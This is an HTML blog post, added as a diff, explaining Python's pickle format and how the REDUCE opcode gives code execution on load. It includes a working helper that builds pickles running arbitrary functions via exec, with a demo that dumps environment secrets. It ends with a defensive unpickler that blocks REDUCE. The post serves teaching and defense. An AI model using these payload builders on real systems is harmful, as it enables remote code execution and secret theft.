@@ -1,0 +1,408 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1, shrink-to-fit=no"
+  />
+
+  <meta name="generator" content="Hugo 0.80.0" /> 
+  <meta name="description" content="Some description" />
+   
+  <link
+    rel="apple-touch-icon"
+    sizes="180x180"
+    href="apple-touch-icon.png"
+  />
+
+  <meta
+    name="msapplication-TileColor"
+    content="#da532c"
+  />
+
+  <meta name="theme-color" content="#ffffff" />
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" />
+
+  <link
+    href="https://fonts.googleapis.com/css?family=Gentium+Book+Basic"
+    rel="stylesheet"
+    type="text/css"
+  />
+  <link
+    href="https://fonts.googleapis.com/css?family=Ubuntu+Mono"
+    rel="stylesheet"
+    type="text/css"
+  />
+
+  <title></title>
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
+        tex2jax: { inlineMath: [ ["$", "$"], ["\\(", "\\)"] ], displayMath: [ ["$$","$$"], ["\\[", "\\]"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno" },
+        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } } },
+        messageStyle: "none"
+    });
+  </script>
+  <script
+    type="text/javascript"
+    async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"
+  ></script>
+
+  <style>
+  body {
+    min-width: 300px;
+    padding: 20px;
+  }
+
+  .custom-navbar {
+    margin-bottom: 1em;
+    height: 60px;
+  }
+
+  .custom-navbar a {
+    display: inline-block;
+    padding: 18px 0;
+    margin-right: 1em;
+    font-weight: bold;
+  }
+
+  .custom-navbar a:hover,
+  .custom-navbar a:focus {
+    text-decoration: none;
+  }
+
+  @media print {
+    .custom-navbar {
+      display: none;
+    }
+  }
+
+  article {
+    padding-bottom: 1em;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  
+  body {
+    background-color: #fff;
+  }
+  
+
+  
+  body {
+    color: #212529;
+  }
+  
+
+  
+  a {
+    color: #007bff;
+  }
+  
+
+  
+  a:hover,
+  a:focus {
+    color: #0056b3;
+  }
+  
+
+  
+  .custom-navbar {
+    background-color: #212529;
+  }
+  
+
+  
+  .custom-navbar a {
+    color: rgba(255, 255, 255, 0.75);
+  }
+  
+
+  
+  .custom-navbar a:hover,
+  .custom-navbar a:focus {
+    color: rgba(255, 255, 255, 1);
+  }
+  
+
+  
+  .container {
+    max-width: 800px;
+  }
+  
+
+  
+  pre {
+    display: block;
+    padding: 9.5px;
+    word-break: break-all;
+    word-wrap: break-word;
+    background-color: #f5f5f5;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+  }
+
+  pre code {
+    padding: 0;
+    font-size: inherit;
+    color: inherit;
+    white-space: pre-wrap;
+    background-color: transparent;
+    border: none;
+    border-radius: 0;
+  }
+
+  code {
+    padding: 2px 4px;
+    color: inherit;
+    background-color: #f5f5f5;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: .9em;
+  }
+  
+
+  @import url('https://rsms.me/inter/inter.css');
+  html { font-family: 'Inter', sans-serif; }
+  @supports (font-variation-settings: normal) {
+    html { font-family: 'Inter var', sans-serif; }
+  }
+
+  code {
+    font-family: 'Ubuntu Mono', monospace, serif;
+  }
+
+  
+  blockquote,
+  .blockquote {
+    padding: 10px 20px;
+    margin: 0 0 20px;
+    font-size: 1em;
+    border-left: 5px solid #6c757d;
+  }
+  
+</style>
+
+</head>
+
+
+<body>
+  <div class="container">
+    <article>
+      <h1>Tricky Pickle</h1>
+<p>Everybody knows Python&rsquo;s <code>pickle</code> module has prickly edges, just like a real pickle. The <a href="https://docs.python.org/3/library/pickle.html">documentation</a> even has a big red box right at the top. The <code>pickle</code> file format is technically a program for the pickle stack machine, nicely described in <a href="https://github.com/python/cpython/blob/main/Lib/pickletools.py"><code>Lib/pickletools.py</code></a>. Briefly, instructions (opcodes) create Python primitives (<code>int</code>s, <code>str</code>s, <code>tuple</code>s, etc.) on a stack. Some extra bits are used to:</p>
+<ul>
+<li>preserve object references across serialization (e.g. if you save a list containing the same object twice, it will be deserialized into the same list rather than a list with two different objects with the same values)</li>
+<li>de-duplicate references via a memoization table (an array of already-deserialized objects)</li>
+<li>run custom deserialization code on objects</li>
+</ul>
+<p>Let&rsquo;s take a quick look inside a pickle using the <code>pickletools</code> standard library module.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> pickle
+
+<span style="color:#75715e"># Serialize a very simple Python object so we can see the structure of a pickle</span>
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;out.pkl&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+    <span style="color:#75715e"># Save the number &#39;0x10&#39;</span>
+    pickle<span style="color:#f92672">.</span>dump(<span style="color:#ae81ff">0x10</span>, f)
+</code></pre></div><p>First let&rsquo;s inspect the raw bytes of <code>out.pkl</code> with <code>xxd</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">!</span>xxd out<span style="color:#f92672">.</span>pkl
+</code></pre></div><pre><code>00000000: 8004 4b10 2e                             ..K..
+</code></pre>
+<p>Only 5 bytes, it&rsquo;s practically a nibble. The 0x10 is in there but it still looks mostly like gobbledegook. That&rsquo;s where <code>pickletools.dis</code> comes in</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> pickletools
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;out.pkl&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+    <span style="color:#75715e"># Read the pickle and dump out a readable version</span>
+    pickletools<span style="color:#f92672">.</span>dis(f)
+</code></pre></div><pre><code>    0: \x80 PROTO      4
+    2: K    BININT1    16
+    4: .    STOP
+highest protocol among opcodes = 2
+</code></pre>
+<p>The output here is thankfully small since the pickle is just a few bytes. In a nutshell, this program pushes 0x10 (decimal 16) on the stack, then pops it off and returns it up. For each one:</p>
+<ul>
+<li><a href="https://github.com/python/cpython/blob/9b52920173735ac609664c6a3a3021d24a95a092/Lib/pickletools.py#L2123"><code>PROTO</code></a> - a version number for the bytes in the pickle (not technically required)</li>
+<li><a href="https://github.com/python/cpython/blob/9b52920173735ac609664c6a3a3021d24a95a092/Lib/pickletools.py#L1196"><code>BININT1</code></a> - read a 1 byte unsigned integer</li>
+<li><a href="https://github.com/python/cpython/blob/9b52920173735ac609664c6a3a3021d24a95a092/Lib/pickletools.py#L2135"><code>STOP</code></a> - stop reading bytes (useful if multiple pickles are embedded in the same file)</li>
+</ul>
+<h2 id="reduce"><code>REDUCE</code></h2>
+<p>Pokies of pricklies is the <code>REDUCE</code> opcode. When the pickle stack machine runs a <code>REDUCE</code> instruction, it will pop from the stack a global reference (in the form of <code>&lt;module&gt;.&lt;attribute&gt;</code>, like <code>__builtin__.print</code> or <code>sys.exit</code>) and a tuple of arguments. So if a malicious user can control the input to the <code>REDUCE</code> opcode (which is trivial as we will see if you unpickle user input) they have code execution. When is this actually used? If an object undergoing pickling implements <code>__reduce__</code>, it can return these two things (the reference and the argument tuple)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyClass</span>:
+    <span style="color:#66d9ef">def</span> __init__(self, x):
+        self<span style="color:#f92672">.</span>x <span style="color:#f92672">=</span> x
+    
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+        <span style="color:#66d9ef">return</span> (MyClass, (<span style="color:#ae81ff">100</span>,))
+
+m <span style="color:#f92672">=</span> MyClass(<span style="color:#ae81ff">12</span>)
+pickletools<span style="color:#f92672">.</span>dis(pickle<span style="color:#f92672">.</span>dumps(m))
+</code></pre></div><pre><code>    0: \x80 PROTO      4
+    2: \x95 FRAME      30
+   11: \x8c SHORT_BINUNICODE '__main__'
+   21: \x94 MEMOIZE    (as 0)
+   22: \x8c SHORT_BINUNICODE 'MyClass'
+   31: \x94 MEMOIZE    (as 1)
+   32: \x93 STACK_GLOBAL
+   33: \x94 MEMOIZE    (as 2)
+   34: K    BININT1    100
+   36: \x85 TUPLE1
+   37: \x94 MEMOIZE    (as 3)
+   38: R    REDUCE
+   39: \x94 MEMOIZE    (as 4)
+   40: .    STOP
+highest protocol among opcodes = 4
+</code></pre>
+<p>This one is a bit bigger with some special opcodes since pickle has special handling for built-in simple objects like <code>int</code> and <code>list</code> but not the custom <code>MyClass</code>. Consult the docs for details, but long story short <code>MEMOIZE</code> codes and <code>FRAME</code> are unnecessary:</p>
+<pre><code>    0: \x80 PROTO      4
+   11: \x8c SHORT_BINUNICODE '__main__'
+   22: \x8c SHORT_BINUNICODE 'MyClass'
+   32: \x93 STACK_GLOBAL
+   34: K    BININT1    100
+   36: \x85 TUPLE1
+   38: R    REDUCE
+   40: .    STOP
+highest protocol among opcodes = 4
+</code></pre><p>It helps to read it from top to bottom since that&rsquo;s the way the stack will see things. This pickle program will <code>REDUCE</code> (call) a <code>STACK_GLOBAL</code> (a reference, here <code>__main__.MyClass</code>) with the argument <code>TUPLE1</code> (here <code>tuple(100)</code>). This also helpfully shows us what we need to replicate in order to execute arbitrary code.</p>
+<h2 id="making-pickles">Making Pickles</h2>
+<p>We&rsquo;re going to stop with <code>pickle.dump</code> and drop down into saving bytes manually now. <code>pickletools</code> will help once again since it contains a nice opcode database out-of-the-box.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_int</span>(i):
+    <span style="color:#75715e"># go from pickletools&#39; opcode description to the byte it represents</span>
+    <span style="color:#66d9ef">return</span> int(i[<span style="color:#ae81ff">2</span>:], <span style="color:#ae81ff">16</span>) <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span>) <span style="color:#66d9ef">else</span> ord(i)
+
+<span style="color:#75715e"># dict of opcode name -&gt; opcode value</span>
+codes <span style="color:#f92672">=</span> {c<span style="color:#f92672">.</span>name: to_int(c<span style="color:#f92672">.</span>code) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> pickletools<span style="color:#f92672">.</span>opcodes}
+
+<span style="color:#75715e"># this helper function will make it easier for us to build pickles</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">construct</span>(<span style="color:#f92672">*</span>args):
+    data <span style="color:#f92672">=</span> []
+
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> args:
+        <span style="color:#66d9ef">if</span> isinstance(i, str):
+            <span style="color:#75715e"># encode strings as len, string data as specified by the</span>
+            <span style="color:#75715e"># BINUNICODE opcodes</span>
+            i_bytes <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>encode()
+            data<span style="color:#f92672">.</span>append(len(i_bytes))
+            data <span style="color:#f92672">+=</span> i_bytes
+        <span style="color:#66d9ef">elif</span> isinstance(i, int):
+            <span style="color:#75715e"># add ints directly to the byte stream</span>
+            data<span style="color:#f92672">.</span>append(i)
+
+    <span style="color:#66d9ef">return</span> bytes(data)
+</code></pre></div><p>First let&rsquo;s use this API to build the simple pickle from earlier and verify that it is correct via <code>pickletools</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">data <span style="color:#f92672">=</span> construct(
+    codes[<span style="color:#e6db74">&#34;BININT1&#34;</span>],
+    <span style="color:#ae81ff">0x10</span>,
+    codes[<span style="color:#e6db74">&#34;STOP&#34;</span>],
+)
+
+pickletools<span style="color:#f92672">.</span>dis(data)
+</code></pre></div><pre><code>    0: K    BININT1    16
+    2: .    STOP
+highest protocol among opcodes = 1
+</code></pre>
+<p>(note that <code>PROTO</code> isn&rsquo;t strictly required). That was easy enough, now let&rsquo;s actually call some Python function with <code>REDUCE</code> and <code>exec</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">data <span style="color:#f92672">=</span> construct(
+    codes[<span style="color:#e6db74">&#34;SHORT_BINUNICODE&#34;</span>],
+    <span style="color:#e6db74">&#34;__builtin__&#34;</span>,
+    codes[<span style="color:#e6db74">&#34;SHORT_BINUNICODE&#34;</span>],
+    <span style="color:#e6db74">&#34;exec&#34;</span>,
+    codes[<span style="color:#e6db74">&#34;STACK_GLOBAL&#34;</span>],
+    codes[<span style="color:#e6db74">&#34;SHORT_BINUNICODE&#34;</span>],
+    <span style="color:#e6db74">&#34;print(&#39;hello from pickle&#39;)&#34;</span>,
+    codes[<span style="color:#e6db74">&#34;TUPLE1&#34;</span>],
+    codes[<span style="color:#e6db74">&#34;REDUCE&#34;</span>],
+    codes[<span style="color:#e6db74">&#34;STOP&#34;</span>],
+)
+
+pickle<span style="color:#f92672">.</span>loads(data)
+</code></pre></div><pre><code>hello from pickle
+</code></pre>
+<p>Wowza! This pickle ran the Python code stored as a string in the pickle data via the Python builtin <code>exec</code>. We can gussy this up a bit with <code>inspect</code> to make crafting payloads easier.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> inspect
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">call_function_from_pickle</span>(fn):
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    Return a pickle that runs &#39;fn&#39; when it is &#39;pickle.load&#39;-ed
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    <span style="color:#66d9ef">return</span> construct(
+        codes[<span style="color:#e6db74">&#34;SHORT_BINUNICODE&#34;</span>],
+        <span style="color:#e6db74">&#34;__builtin__&#34;</span>,
+        codes[<span style="color:#e6db74">&#34;SHORT_BINUNICODE&#34;</span>],
+        <span style="color:#e6db74">&#34;exec&#34;</span>,
+        codes[<span style="color:#e6db74">&#34;STACK_GLOBAL&#34;</span>],
+        codes[<span style="color:#e6db74">&#34;SHORT_BINUNICODE&#34;</span>],
+        inspect<span style="color:#f92672">.</span>getsource(fn)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> f<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{fn.__name__}()&#34;</span>,
+        codes[<span style="color:#e6db74">&#34;TUPLE1&#34;</span>],
+        codes[<span style="color:#e6db74">&#34;REDUCE&#34;</span>],
+        codes[<span style="color:#e6db74">&#34;STOP&#34;</span>],
+    )
+</code></pre></div><p>This will create a pickle containing the code of whatever function <code>fn</code> is passed in as text.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_environment</span>():
+    <span style="color:#f92672">import</span> subprocess
+
+    proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74">&#34;printenv&#34;</span>], stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>)
+    <span style="color:#66d9ef">print</span>(proc<span style="color:#f92672">.</span>stdout)
+
+data <span style="color:#f92672">=</span> call_function_from_pickle(show_environment)
+
+pickle<span style="color:#f92672">.</span>loads(data)
+</code></pre></div><pre><code>MY_SECRET=i dont know how to cook beans without microwaving them
+</code></pre>
+<p>That&rsquo;s looking pretty nice, and it&rsquo;d be simple now to instead of <code>print</code>-ing that (sensitive) data out that it is shipped off to some attacker-controlled server via <code>urllib</code>.</p>
+<h2 id="what">What?</h2>
+<p>This is great but accepting everyone pretty much knows not to load random pickles at this point. If you&rsquo;re really paranoid you can disable <code>REDUCE</code> opcodes entirely by messing with some <code>pickle</code> internals</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> io
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">no_reduce</span>(<span style="color:#f92672">*</span>args):
+    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">RuntimeError</span>(<span style="color:#e6db74">&#34;no REDUCE-ing allowed!&#34;</span>)
+
+<span style="color:#75715e"># Create a custom unpickler</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyUnpickler</span>(pickle<span style="color:#f92672">.</span>_Unpickler):
+    <span style="color:#66d9ef">def</span> __init__(self, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+        super()<span style="color:#f92672">.</span>__init__(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
+
+        <span style="color:#75715e"># When pickle sees a REDUCE, it will try to access this entry in the</span>
+        <span style="color:#75715e"># table, so make it a stub that throws an error</span>
+        self<span style="color:#f92672">.</span>dispatch[pickle<span style="color:#f92672">.</span>REDUCE[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> no_reduce
+
+malicious_bytes <span style="color:#f92672">=</span> call_function_from_pickle(show_environment)
+MyUnpickler(file<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>BytesIO(malicious_bytes))<span style="color:#f92672">.</span>load()
+</code></pre></div><pre><code>---------------------------------------------------------------------------
+
+RuntimeError                              Traceback (most recent call last)
+
+/tmp/ipykernel_396000/12930.py in &lt;module&gt;
+     16 
+     17 malicious_bytes = call_function_from_pickle(show_environment)
+---&gt; 18 MyUnpickler(file=io.BytesIO(malicious_bytes)).load()
+
+
+~/miniconda3/lib/python3.9/pickle.py in load(self)
+   1210                     raise EOFError
+   1211                 assert isinstance(key, bytes_types)
+-&gt; 1212                 dispatch[key[0]](self)
+   1213         except _Stop as stopinst:
+   1214             return stopinst.value
+
+/tmp/ipykernel_396000/12930.py in no_reduce(*args)
+      2 
+      3 def no_reduce(*args):
+----&gt; 4     raise RuntimeError(&quot;no REDUCE-ing allowed!&quot;)
+      5 
+      6 
+
+RuntimeError: no REDUCE-ing allowed!
+</code></pre>
+
+    </article>
+  </div>
+</body>
+
+</html>
